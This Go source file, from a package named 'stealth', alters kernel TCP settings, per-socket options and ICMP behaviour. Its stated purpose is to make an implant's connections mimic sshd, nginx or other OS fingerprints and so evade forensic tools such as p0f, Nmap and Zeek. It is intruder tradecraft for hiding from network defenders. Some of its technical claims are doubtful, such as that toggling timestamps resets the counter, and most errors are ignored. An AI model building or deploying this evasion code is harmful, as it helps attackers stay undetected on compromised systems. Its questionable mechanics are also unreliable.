package stealth

import (
	"fmt"
	"os"
	"syscall"
)

// TCP/IP Stack Fingerprint Spoofing
//
// OPSEC rationale: Network forensics tools (p0f, Nmap OS detection, Zeek)
// fingerprint the OS by analyzing TCP parameters: window size, TTL, MSS,
// TCP options order, DF bit, etc. A Go binary on Linux produces a distinctive
// TCP fingerprint that doesn't match what sshd or nginx would produce.
// By tuning these parameters, our connections look like they come from the
// expected service's network stack.

// TCPProfile defines TCP stack parameters for a specific OS/service fingerprint.
type TCPProfile struct {
	Name        string
	TTL         int
	WindowSize  int
	MSS         int
	WindowScale int
	SACKPerm    bool
	Timestamps  bool
}

// KnownProfiles contains TCP fingerprints for common Linux service configurations.
var KnownProfiles = map[string]TCPProfile{
	"linux-default": {
		Name:        "Linux 6.x default",
		TTL:         64,
		WindowSize:  65535,
		MSS:         1460,
		WindowScale: 7,
		SACKPerm:    true,
		Timestamps:  true,
	},
	"sshd-linux": {
		Name:        "OpenSSH on Linux",
		TTL:         64,
		WindowSize:  65535,
		MSS:         1460,
		WindowScale: 7,
		SACKPerm:    true,
		Timestamps:  true,
	},
	"nginx-linux": {
		Name:        "nginx on Linux",
		TTL:         64,
		WindowSize:  65535,
		MSS:         1460,
		WindowScale: 7,
		SACKPerm:    true,
		Timestamps:  true,
	},
	"windows-server": {
		Name:        "Windows Server 2019+",
		TTL:         128,
		WindowSize:  65535,
		MSS:         1460,
		WindowScale: 8,
		SACKPerm:    true,
		Timestamps:  false,
	},
	"macos": {
		Name:        "macOS 14+",
		TTL:         64,
		WindowSize:  65535,
		MSS:         1460,
		WindowScale: 6,
		SACKPerm:    true,
		Timestamps:  true,
	},
	"low-profile": {
		Name:        "Minimal fingerprint",
		TTL:         64,
		WindowSize:  29200,
		MSS:         1460,
		WindowScale: 7,
		SACKPerm:    true,
		Timestamps:  false, // disable timestamps to reduce fingerprintable surface
	},
}

// ApplyTCPProfile configures the system TCP stack to match a target fingerprint.
// Modifies sysctl parameters for the current network namespace.
func ApplyTCPProfile(profileName string) error {
	profile, ok := KnownProfiles[profileName]
	if !ok {
		profile = KnownProfiles["linux-default"]
	}

	// Set default TTL
	if err := writeSysctl("/proc/sys/net/ipv4/ip_default_ttl", profile.TTL); err != nil {
		return fmt.Errorf("set ttl: %w", err)
	}

	// TCP window scaling
	if profile.WindowScale > 0 {
		writeSysctl("/proc/sys/net/ipv4/tcp_window_scaling", 1)
	} else {
		writeSysctl("/proc/sys/net/ipv4/tcp_window_scaling", 0)
	}

	// SACK
	if profile.SACKPerm {
		writeSysctl("/proc/sys/net/ipv4/tcp_sack", 1)
	} else {
		writeSysctl("/proc/sys/net/ipv4/tcp_sack", 0)
	}

	// TCP timestamps
	if profile.Timestamps {
		writeSysctl("/proc/sys/net/ipv4/tcp_timestamps", 1)
	} else {
		writeSysctl("/proc/sys/net/ipv4/tcp_timestamps", 0)
	}

	// Initial receive window
	writeSysctl("/proc/sys/net/ipv4/tcp_adv_win_scale", 1)

	// Reduce TCP fingerprint surface — disable ECN
	writeSysctl("/proc/sys/net/ipv4/tcp_ecn", 0)

	return nil
}

// ApplySocketProfile sets per-socket TCP options to match the target fingerprint.
// Call this on each outbound connection's raw fd.
func ApplySocketProfile(fd int, profileName string) error {
	profile, ok := KnownProfiles[profileName]
	if !ok {
		profile = KnownProfiles["linux-default"]
	}

	// Set TTL on this specific socket
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_TTL, profile.TTL)

	// Set send/receive buffer to influence window size
	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, profile.WindowSize)
	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, profile.WindowSize)

	// Set MSS (maximum segment size)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_MAXSEG, profile.MSS)

	return nil
}

// SetSocketTTL sets the IP TTL on a raw socket fd.
func SetSocketTTL(fd int, ttl int) error {
	return syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_TTL, ttl)
}

// RandomizeTCPTimestamp offsets our TCP timestamp clock to avoid correlation.
// Different from system uptime, makes it harder to fingerprint via timestamp analysis.
func RandomizeTCPTimestamp() error {
	// TCP timestamp offset is controlled by writing to tcp_timestamps
	// Toggling it resets the internal counter
	writeSysctl("/proc/sys/net/ipv4/tcp_timestamps", 0)
	writeSysctl("/proc/sys/net/ipv4/tcp_timestamps", 1)
	return nil
}

// DisableICMPFingerprint prevents ICMP-based OS fingerprinting.
func DisableICMPFingerprint() error {
	// Don't respond to ICMP echo (ping)
	writeSysctl("/proc/sys/net/ipv4/icmp_echo_ignore_all", 1)

	// Don't respond to broadcast pings
	writeSysctl("/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts", 1)

	// Don't send ICMP redirects
	writeSysctl("/proc/sys/net/ipv4/conf/all/send_redirects", 0)

	// Ignore ICMP redirects
	writeSysctl("/proc/sys/net/ipv4/conf/all/accept_redirects", 0)

	return nil
}

func writeSysctl(path string, value int) error {
	return os.WriteFile(path, []byte(fmt.Sprintf("%d", value)), 0644)
}
